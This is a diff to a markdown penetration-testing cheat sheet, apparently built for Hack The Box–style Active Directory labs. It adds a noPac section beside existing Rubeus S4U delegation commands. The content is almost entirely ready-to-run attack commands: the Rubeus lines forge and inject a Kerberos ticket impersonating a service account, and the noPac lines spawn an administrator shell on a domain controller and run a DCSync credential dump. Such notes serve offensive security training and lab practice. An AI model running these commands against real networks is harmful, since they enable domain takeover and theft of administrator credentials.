@@ -779,6 +779,7 @@ cd /usr/share/windows-resources/binaries/
 #### Full Power
 https://github.com/itm4n/FullPowers
 ### S4U
+#### Rubeus
 https://github.com/Kevin-Robertson/Powermad
 <br/>
 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
@@ -799,6 +800,20 @@ Get-DomainComputer TEST | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofot
 
 .\Rubeus.exe hash /user:TEST$ /password:123456 /domain:authority.htb
 .\Rubeus.exe s4u /user:TEST$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:svc_ldap /msdsspn:cifs/TEST.authority.htb /ptt
+```
+#### nopac
+```powershell
+cd /opt/noPac
+source ./autorecon/bin/activate
+
+# scan
+python3 scanner.py htb.local/svc_test:testpass -dc-ip 172.16.5.5 -use-ldap
+
+#psexec
+python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+
+# DCSync
+ python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user htb.local/administrator
 ```
 ### ADCS
 ```powershell
